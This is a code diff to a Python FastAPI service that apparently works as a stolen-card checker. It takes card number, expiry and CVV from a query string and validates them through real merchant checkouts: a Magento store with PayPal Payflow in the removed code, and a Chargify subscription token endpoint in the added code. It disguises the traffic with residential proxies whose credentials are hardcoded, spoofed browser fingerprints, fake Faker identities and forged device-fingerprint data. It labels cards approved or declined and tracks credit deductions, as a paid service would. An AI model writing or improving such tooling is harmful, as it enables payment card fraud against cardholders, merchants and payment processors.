@@ -1,27 +1,52 @@
+from fastapi import FastAPI, HTTPException, Request, APIRouter
 from curl_cffi import requests
-import hashlib, os, random
-from fastapi import FastAPI, Request, APIRouter
-from browserforge.headers import HeaderGenerator
+import hashlib
 from faker import Faker
+from browserforge.headers import HeaderGenerator
+import random
 from bs4 import BeautifulSoup
+import uuid
+import os
+import asyncio
+from typing import Optional
 import traceback
 
+fake = Faker("en_US")
+giners = [
+    'chrome99', 'chrome100', 'chrome101', 'chrome104', 'chrome107', 
+    'chrome110', 'chrome116', 'chrome119', 'chrome120', 'chrome123', 
+    'chrome124', 'chrome131', 'chrome99_android', 'chrome131_android', 
+    'edge99', 'edge101', 'safari15_3', 'safari15_5', 'safari17_0', 
+    'safari17_2_ios', 'safari18_0', 'safari18_0_ios'
+]
+
 def generate_random_device_id():
-    return hashlib.sha256(os.urandom(32)).hexdigest()[:random.randint(8, 36)]
+    length = random.randint(8, 36)
+    seed = os.urandom(32)
+    md5_hash = hashlib.md5(seed).hexdigest()
+    sha1_hash = hashlib.sha1(seed).hexdigest()
+    sha256_hash = hashlib.sha256(seed).hexdigest()
+    sha512_hash = hashlib.sha512(seed).hexdigest()
+    combined_hash = hex(int(md5_hash, 16) ^ int(sha1_hash, 16) ^ int(sha256_hash, 16) ^ int(sha512_hash, 16))[2:]
+    return combined_hash[:length]
 
 
-def cap(string: str, start: str, end: str) -> str:
-    try:
-        str_parts = string.split(start)
-        str_parts = str_parts[1].split(end)
-        return str_parts[0]
-    except IndexError:
-        raise None
-    
+def generate_random_email():
+    domains = ["grubhub.com"]
+    seed = os.urandom(32)
+    md5_hash = hashlib.md5(seed).hexdigest()
+    sha1_hash = hashlib.sha1(seed).hexdigest()
+    sha256_hash = hashlib.sha256(seed).hexdigest()
+    sha512_hash = hashlib.sha512(seed).hexdigest()
+    combined_hash = hex(int(md5_hash, 16) ^ int(sha1_hash, 16) ^ int(sha256_hash, 16) ^ int(sha512_hash, 16))[2:]
+    name_length = random.randint(8, 20)
+    name = combined_hash[:name_length]
+    domain = random.choice(domains)
+    return f"{name}@{domain}"
+
 auth_check = APIRouter(prefix="/auth_check")
 @auth_check.get("/")
 async def tokenize_card(request: Request):
-
     try:
         lista = request.query_params.get('lista').split('|')
         cc = lista[0]
@@ -29,210 +54,155 @@ async def tokenize_card(request: Request):
         yy = lista[2]
         cv = lista[3]
 
-        fake = Faker("en_US")
-        headers_generator = HeaderGenerator()
+        # First get bin info
+        bin_response = requests.get(f'https://api.juspay.in/cardbins/{cc[:6]}')
+        bin_data = bin_response.json()
+        brand = bin_data.get('brand', '').lower()
+        country = bin_data.get('country', '').lower()
+        card_subtype = bin_data.get('card_sub_type', '').lower()
 
-        headers = headers_generator.generate(http_version=2)
-        form_key = f"{generate_random_device_id()}"
-        cookies = {'form_key': form_key,}
-        proxy = {
-            "http":  "http://resi-hexterlorry:qMMVq6P5SD3agZurqOGO_country-US@mobile.resi.gg:5555",
-            "https": "http://resi-hexterlorry:qMMVq6P5SD3agZurqOGO_country-US@mobile.resi.gg:5555"
-        }
-
-        giners = [
-            'chrome99', 'chrome100', 'chrome101', 'chrome104', 'chrome107',
-            'chrome110', 'chrome116', 'chrome119', 'chrome120', 'chrome123',
-            'chrome124', 'chrome131', 'chrome99_android', 'chrome131_android',
-            'edge99', 'edge101', 'safari15_3', 'safari15_5', 'safari17_0',
-            'safari17_2_ios', 'safari18_0', 'safari18_0_ios'
-        ]
-
-        # Initialize session
+        # Validate card brand
+        if brand not in {"visa", "mastercard", "amex", "jcb"}:
+            return {
+                "card": f"{cc}|{mm}|{yy}|{cv}",
+                "status": "Unknown ⚠️",
+                "message": "This credit card type is not accepted.",
+                "bin_info": bin_data
+            }
+        elif card_subtype in {"maestro"}:
+            return {
+                "card": f"{cc}|{mm}|{yy}|{cv}",
+                "status": "Unknown ⚠️",
+                "message": "This credit card type is not accepted.",
+                "bin_info": bin_data
+            }
+        # Setup session
         random_browser = random.choice(giners)
+        sess = requests.Session(verify=False)
+        
+        sess.proxies.update({
+            "http":  f"http://7b1e08748710-res-US:S0f5DbFJDAkxpa2@residential.resi.gg:5959",
+            "https": f"http://7b1e08748710-res-US:S0f5DbFJDAkxpa2@residential.resi.gg:5959"
+        })
+        # Use provided proxy or default
+        # sess.proxies.update({
+        #     "http": "http://desoforgit_gmail_com-dc:26781525-country-US@la.residential.rayobyte.com:8000",
+        #     "https": "http://desoforgit_gmail_com-dc:26781525-country-US@la.residential.rayobyte.com:8000"
+        # })
 
-        session = requests.Session(impersonate=random_browser, verify=False)
-        session.headers = dict(headers)
-        session.proxies.update(proxy)
+        headers_generator = HeaderGenerator()
+        headers = headers_generator.generate()
+        sess.headers = dict(headers)
 
+
+
+        country = "DK"
+        # Generate headers for first request
         headers = {
-            'X-Requested-With': 'XMLHttpRequest',
-            'Content-Type': 'multipart/form-data; boundary=----geckoformboundary3f37d4e149ff553198332de46bacb2fd',
-            'Origin': 'https://www.lathewerks.com',
-            'Referer': 'https://www.lathewerks.com/evox-ti-ecu-bracket.html',
+            'Host': 'blue-line-trading-system.chargifypay.com',
             'Priority': 'u=0',
         }
-        boundary = "------geckoformboundary3f37d4e149ff553198332de46bacb2fd"
-        payload = f"{boundary}\r\nContent-Disposition: form-data; name=\"product\"\r\n\r\n698\r\n{boundary}\r\nContent-Disposition: form-data; name=\"selected_configurable_option\"\r\n\r\n\r\n{boundary}\r\nContent-Disposition: form-data; name=\"related_product\"\r\n\r\n\r\n{boundary}\r\nContent-Disposition: form-data; name=\"item\"\r\n\r\n698\r\n{boundary}\r\nContent-Disposition: form-data; name=\"form_key\"\r\n\r\n{form_key}\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5774]\"\r\n\r\n24686\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5773]\"\r\n\r\n24682\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5775]\"\r\n\r\n24690\r\n{boundary}\r\nContent-Disposition: form-data; name=\"options[5772]\"\r\n\r\n24680\r\n{boundary}\r\nContent-Disposition: form-data; name=\"qty\"\r\n\r\n1\r\n{boundary}--"
 
-        response = session.post(
-            'https://www.lathewerks.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cubGF0aGV3ZXJrcy5jb20vZXZveC10aS1lY3UtYnJhY2tldC5odG1s/product/698/',
-            cookies=cookies,
-            headers=headers,
-            data=payload
-        )
+        # Get security token
+        html_data = sess.get(
+            'https://blue-line-trading-system.chargifypay.com/subscribe/bcyt93vv6s6y',
+            headers=headers
+        ).text
 
-        # Get cart and checkout ID:
+        soup = BeautifulSoup(html_data, "html.parser")
+        div = soup.find("div", id="chargify-js-form")
+        token = div.get("data-security-token")
+        print(token)
 
+
+        # Prepare headers for token request
         headers = {
-            'Connection': 'keep-alive',
-            'Referer': 'https://www.lathewerks.com/evox-ti-ecu-bracket.html',
-            'Priority': 'u=0, i',
+            'Referer': 'https://js.chargify.com/',
+            'content-type': 'application/json',
+            'Origin': 'https://js.chargify.com',
+            'Priority': 'u=0',
         }
 
-        response = session.get('https://www.lathewerks.com/checkout/', cookies=cookies, headers=headers)
-        cart_id = cap(response.text, '"entity_id":"','","store_id"')
-
-
-        # Set shipping/billing:
-
-        headers = {
-                'Accept': '*/*',
-                'Content-Type': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest',
-                'Origin': 'https://www.lathewerks.com',
-                'Connection': 'keep-alive',
-                'Referer': 'https://www.lathewerks.com/checkout/',
-                'Priority': 'u=0',
-            }
 
         json_data = {
-                'addressInformation': {
-                    'shipping_address': {
-                        'countryId': 'US',
-                        'regionId': '43',
-                        'regionCode': 'NY',
-                        'region': fake.city(),
-                        'street': [
-                            fake.street_address(),
-                            '',
-                            '',
-                        ],
-                        'company': '',
-                        'telephone': '3135556666',
-                        'postcode': fake.zipcode(),
-                        'city': 'NY',
-                        'firstname': fake.first_name(),
-                        'lastname': fake.last_name(),
-                    },
-                    'billing_address': {
-                        'countryId': 'US',
-                        'regionId': '43',
-                        'regionCode': 'NY',
-                        'region': fake.city(),
-                        'street': [
-                            fake.street_address(),
-                            '',
-                            '',
-                        ],
-                        'company': '',
-                        'telephone': '3135556666',
-                        'postcode': fake.zipcode(),
-                        'city': 'NY',
-                        'firstname': fake.first_name(),
-                        'lastname': fake.last_name(),
-                        'saveInAddressBook': None,
-                    },
-                    'shipping_method_code': 'freeshipping',
-                    'shipping_carrier_code': 'freeshipping',
-                    'extension_attributes': {},
-                },
-            }
-
-        response = session.post(f'https://www.lathewerks.com/rest/default/V1/guest-carts/{cart_id}/shipping-information',headers=headers,json=json_data)
-
-        # Get secure token:
-
-        headers = {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Origin': 'https://www.lathewerks.com',
-            'Referer': 'https://www.lathewerks.com/checkout/',
+            'key': 'chjs_6spy9mwc54xj8dq7n94vhfx9',
+            'revision': '2025-07-16',
+            'credit_card': {
+                'full_number': cc,
+                'expiration_month': mm,
+                'expiration_year': yy,
+                'cvv': cv,
+                'billing_address': f'{fake.street_address()}',
+                'billing_city': fake.city(),
+                'billing_country': country.upper(),
+                'billing_state': fake.state_abbr(include_territories=False),
+                'billing_zip': f'{fake.zipcode()}',
+                'first_name': fake.first_name(),
+                'last_name': fake.last_name(),
+                'device_data': "{\"device_session_id\":\""+generate_random_device_id()+"\",\"fraud_merchant_id\":\""+generate_random_device_id()+"\",\"correlation_id\":\""+generate_random_device_id()+"\",\"browser_info\":{\"user_agent\":\""+sess.headers.get('User-Agent')+"\",\"screen_width\":"+str(random.randint(400,4000))+",\"screen_height\":"+str(random.randint(400,4000))+",\"timezone_offset\":-70,\"language\":\"en-US\",\"java_enabled\":false}}",
+            },
+            'security_token': token,
+            'currency': 'USD',
+            'psp_token': f'{generate_random_device_id()}',
+            'h': '',
         }
 
-        data = [
-            ('form_key', form_key),
-            ('captcha_form_id', 'payment_processing_request'),
-            ('payment[method]', 'payflowpro'),
-            ('billing-address-same-as-shipping', 'on'),
-            ('captcha_form_id', 'co-payment-form'),
-            ('controller', 'checkout_flow'),
-            ('cc_type', 'VI'),
-        ]
 
-        response = session.post('https://www.lathewerks.com/paypal/transparent/requestSecureToken/',headers=headers,data=data)
-        secure_token = response.json()['payflowpro']['fields']['securetoken']
-        secure_token_id = response.json()['payflowpro']['fields']['securetokenid']
-        # return response.text
+        # Generate hash
+        card = json_data["credit_card"]
+        del card["device_data"]
+        values = [v for _, v in sorted(card.items())]
+        joined = "ﾠ".join(values)
+        final_hash = hashlib.sha1(joined.encode('utf-8')).hexdigest()
+        json_data['h'] = final_hash
 
-        # Make payment:
+        # Make the token request
+        response = sess.post(
+            'https://blue-line-trading-system.chargify.com/js/tokens.json',
+            headers=headers,
+            json=json_data
+        )
+        response_data = response.json()
 
-        headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.lathewerks.com',
-            'Connection': 'keep-alive',
-            'Referer': 'https://www.lathewerks.com/',
-            'Priority': 'u=0',
-        }
-
-        data = {
-            'result': '0',
-            'securetoken': secure_token,
-            'securetokenid': secure_token_id,
-            'respmsg': 'Approved',
-            'result_code': '0',
-            'csc': cv,
-            'expdate': f'{mm}{yy[2:]}',
-            'acct': cc,
-        }
-
-        response = session.post('https://payflowlink.paypal.com/', headers=headers, data=data)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        # print(soup)
-        tag = soup.find('input', attrs={'name': 'AVSZIP'})
-        AVSZIP = tag.get('value') if tag else "U"
-
-        tag = soup.find('input', attrs={'name': 'HOSTCODE'})
-        HOSTCODE = tag.get('value') if tag else "None"
-
-        tag = soup.find('input', attrs={'name': 'CVV2MATCH'})
-        CVV2MATCH = tag.get('value') if tag else "U"
-
-        tag = soup.find('input', attrs={'name': 'RESPMSG'})
-        RESPMSG = tag.get('value') if tag else None
-
-        if RESPMSG == 'Verified: 10574-This card authorization verification is not a payment transaction.':
+        if response_data.get('token'):
             return {
                 "card": f"{cc}|{mm}|{yy}|{cv}",
                 "status": "Approved ✅",
-                "message": f"Approval - 00",
-                "cvc/avs": f"{CVV2MATCH}/{AVSZIP}",
-                "code": f"{HOSTCODE}",
-                "deduct_credits": True}
-        elif 'RESPMSG' not in response.text:
+                "message": "Card added",
+                "bin_info": bin_data,
+                "token": response_data['token']
+            }
+        elif response_data.get('errors') == 'Processor declined: Unavailable ()':
+            message = response_data.get('errors', 'Card declined')
             return {
-                    "card": f"{cc}|{mm}|{yy}|{cv}",
-                    "status": "Unknown ⚠️",
-                    "message": "API error",
-                    "cvc/avs": f"{CVV2MATCH}/{AVSZIP}",
-                    "code": f"{HOSTCODE}",
-                    "deduct_credits": False
-                    }        
+                "card": f"{cc}|{mm}|{yy}|{cv}",
+                "status": "Unknown ⚠️",
+                "message": f"{message}",
+                "bin_info": bin_data,
+                "token": response_data['token']
+            }
+        elif "Approved (1000)" in response.text:
+            return {
+                "card": f"{cc}|{mm}|{yy}|{cv}",
+                "status": "Approved ✅",
+                "message": "Approved (1000)",
+                "bin_info": bin_data,
+                "token": response_data['token']
+            }
         else:
+            message = response_data.get('errors', 'Card declined')
             return {
-                    "card": f"{cc}|{mm}|{yy}|{cv}",
-                    "status": "Declined ❌",
-                    "message": RESPMSG,
-                    "cvc/avs": f"{CVV2MATCH}/{AVSZIP}",
-                    "code": f"{HOSTCODE}",
-                    "deduct_credits": True
-                    } 
+                "card": f"{cc}|{mm}|{yy}|{cv}",
+                "status": "Declined ❌",
+                "message": f"{message}",
+                "bin_info": bin_data
+            }
+
     except Exception as e:
         return {
-            "card": request.query_params.get('lista', ''),
-            "status": "Unknown ⚠️",
-            "message": "API error",
-            "trace": str(traceback.format_exc()),
-        }
+                "card": f"{cc}|{mm}|{yy}|{cv}",
+                "status": "API Error ⚠️",
+                "message": "Recheck",
+                "bin_info": bin_data if 'bin_data' in locals() else None,
+                "ecv": str(traceback.format_exc())
+            }
